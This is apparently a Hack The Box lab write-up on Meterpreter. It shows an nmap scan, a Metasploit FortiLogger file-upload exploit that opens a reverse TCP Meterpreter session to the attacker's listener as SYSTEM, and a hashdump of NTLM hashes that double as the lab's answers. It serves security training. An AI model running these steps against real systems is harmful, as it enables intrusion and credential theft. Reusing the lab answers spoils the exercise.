
## Meterpreter

- Its a specific type of multi-faceted payload that uses `DLL Injection` to ensure the connection with the victim machine stays stable and difficult to detect.
- Meterpreter resides in the memory instead of the hard disk making it further difficult to be detected using traditional digital forensic techniques.

---
## Questions and Solutions


- Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?
	- **NT AUTHORITY\SYSTEM**


### Scanning the Target

Using `nmap` to scan the target for recon.

```bash
$ sudo nmap -sV -sC -T4 10.129.203.65 -vvv
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-06 12:24 EST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:24
Completed NSE at 12:24, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:24
Completed NSE at 12:24, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:24
Completed NSE at 12:24, 0.00s elapsed
Initiating Ping Scan at 12:24
Scanning 10.129.203.65 [4 ports]
Completed Ping Scan at 12:24, 0.26s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:24
Completed Parallel DNS resolution of 1 host. at 12:24, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 12:24
Scanning 10.129.203.65 [1000 ports]
Discovered open port 139/tcp on 10.129.203.65
Discovered open port 3389/tcp on 10.129.203.65
Discovered open port 445/tcp on 10.129.203.65
Discovered open port 135/tcp on 10.129.203.65
Discovered open port 5985/tcp on 10.129.203.65
Discovered open port 5000/tcp on 10.129.203.65
Completed SYN Stealth Scan at 12:24, 3.37s elapsed (1000 total ports)
Initiating Service scan at 12:24
Scanning 6 services on 10.129.203.65
Completed Service scan at 12:24, 18.34s elapsed (6 services on 1 host)
NSE: Script scanning 10.129.203.65.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:24
Completed NSE at 12:24, 11.92s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:24
Completed NSE at 12:25, 1.04s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:25
Completed NSE at 12:25, 0.01s elapsed
Nmap scan report for 10.129.203.65
Host is up, received reset ttl 127 (0.23s latency).
Scanned at 2026-03-06 12:24:25 EST for 35s
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       REASON          VERSION
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-51BJ97BCIPV
|   NetBIOS_Domain_Name: WIN-51BJ97BCIPV
|   NetBIOS_Computer_Name: WIN-51BJ97BCIPV
|   DNS_Domain_Name: WIN-51BJ97BCIPV
|   DNS_Computer_Name: WIN-51BJ97BCIPV
|   Product_Version: 10.0.17763
|_  System_Time: 2026-03-06T17:24:11+00:00
| ssl-cert: Subject: commonName=WIN-51BJ97BCIPV
| Issuer: commonName=WIN-51BJ97BCIPV
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-05T16:59:00
| Not valid after:  2026-09-04T16:59:00
| MD5:   82ac:86bc:47af:dc45:dc20:d69f:7f62:a0ad
| SHA-1: 6193:0308:1734:84fd:5bf7:e682:aeb2:ba9a:ac9a:ea5c
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQHRrPGipRMb9Pd71KDumPuzANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9XSU4tNTFCSjk3QkNJUFYwHhcNMjYwMzA1MTY1OTAwWhcNMjYw
| OTA0MTY1OTAwWjAaMRgwFgYDVQQDEw9XSU4tNTFCSjk3QkNJUFYwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQCyP38uj3NfLnPYMUTjqGgzE3pTearXEBBc
| tn3Ld+JgZgR95ijREE5ftkA5gU7opGxx8yQROZIqyBl+1IhFX78OUOUVlTqojAF3
| ZkEC9IbikONLX1Dxi0ut8jptMWmirBTUBmWzyeA/agxfXlxQhiH2UQFzGHpUlLdZ
| 1EynyWKWQpH6YMW1TBUIExZkd5bUi74d9YB1sBg/WG1PWsIdijrho5vBtA/lErRN
| hlr7vTiZ9+6X0+qrydAm+6mrwvaeXKI+sYiH/1wfxXdFBnDyXQwkP3CIigQtgY1H
| bpOczrMh1KInsW7P6NIE7U6e/Old6x8iXEJwXzEeuatIiYqgquTBAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAErJCh2L54GHsyXUqUB2CxghPD79BgyU2ZqsK5Rbsxw/z6mSeGEIoPFU2
| xXo+s2D7mI39vnoP871M8TmIGEeLxmrwZp0XpPJd02LINu/h7F4L+Hl/tzy6050R
| QIVDGTWmkKKwu1rGZttwCDQpm6NB2LEO7sZ6GKq6OlbT2CPc18EOsGVhSYUaZyF0
| fC4MYyomN0sgfKrlty4PpKtUjQa3O39bXnxob76IZIs+UHFJ0eGarLMaDaXv/xvL
| fikt+iDCJt09zSS2RJAkNzuan1dqqKRo11keQU1eKnbpBt04IJd0ryLq46T1s8xf
| kl/kbaznuSpyuzzHkWHADqPKYW2rxw==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-03-06T17:24:21+00:00; -39s from scanner time.
5000/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: FortiLogger | Log and Report System
|_http-favicon: Unknown favicon MD5: E4B674BE34803DBC1F1D53737A490D0C
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-06T17:24:12
|_  start_date: N/A
|_clock-skew: mean: -38s, deviation: 0s, median: -38s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 53983/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 48873/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 49813/udp): CLEAN (Failed to receive data)
|   Check 4 (port 34157/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:25
Completed NSE at 12:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:25
Completed NSE at 12:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:25
Completed NSE at 12:25, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.58 seconds
           Raw packets sent: 1264 (55.592KB) | Rcvd: 1389 (55.584KB)

```

We found something interesting at port `5000`. 

### Looking for Exploit

```bash
msf > search Fortilogger

Matching Modules
================

   #  Name                                                   Disclosure Date  Rank    Check  Description
   -  ----                                                   ---------------  ----    -----  -----------
   0  exploit/windows/http/fortilogger_arbitrary_fileupload  2021-02-26       normal  Yes    FortiLogger Arbitrary File Upload Exploit

```

### Exploitation Phase

```bash
msf > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/http/fortilogger_arbitrary_fileupload) > show options

Module options (exploit/windows/http/fortilogger_arbitrary_fileupload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, socks5h
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      5000             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the FortiLogger
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.149.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   FortiLogger < 5.2.0



View the full module info with the info, or info -d command.

msf exploit(windows/http/fortilogger_arbitrary_fileupload) > set LHOST 10.10.15.91
LHOST => 10.10.15.91
msf exploit(windows/http/fortilogger_arbitrary_fileupload) > set RHOSTS 10.129.203.65
RHOSTS => 10.129.203.65
msf exploit(windows/http/fortilogger_arbitrary_fileupload) > show options

Module options (exploit/windows/http/fortilogger_arbitrary_fileupload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, socks5h
   RHOSTS     10.129.203.65    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      5000             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the FortiLogger
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.15.91      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   FortiLogger < 5.2.0



View the full module info with the info, or info -d command.

msf exploit(windows/http/fortilogger_arbitrary_fileupload) > run
[*] Started reverse TCP handler on 10.10.15.91:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. FortiLogger version 4.4.2.2
[+] Generate Payload
[+] Payload has been uploaded
[*] Executing payload...
[*] Sending stage (177734 bytes) to 10.129.203.65
[*] Meterpreter session 1 opened (10.10.15.91:4444 -> 10.129.203.65:49689) at 2026-03-06 12:30:51 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```


- Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.
	- **cf3a5525ee9414229e66279623ed5c58**

### Dumping Hashes

Using the `hashdump` command of Metasploit we can dump hashes or basically extract hashes from the SAM database of the windows system and since we have `NT AUTHORITY\SYSTEM` privileges we can do it easily.

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
```

### Breaking Down the NTLM Hash

```bash
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
```

- `htb-student` is the User.
- `1002` is the `RID` i.e. a security identifier value present at the last part of `SID` which identifies a user, group or object of the Active Directory.
- `aad3b435b51404eeaad3b435b51404ee` means LM Hashing is disabled because its highly insecure.
- `cf3a5525ee9414229e66279623ed5c58` NTLM Hash part. Used to store password hashes in SAM Database of Windows. This is the modern method.


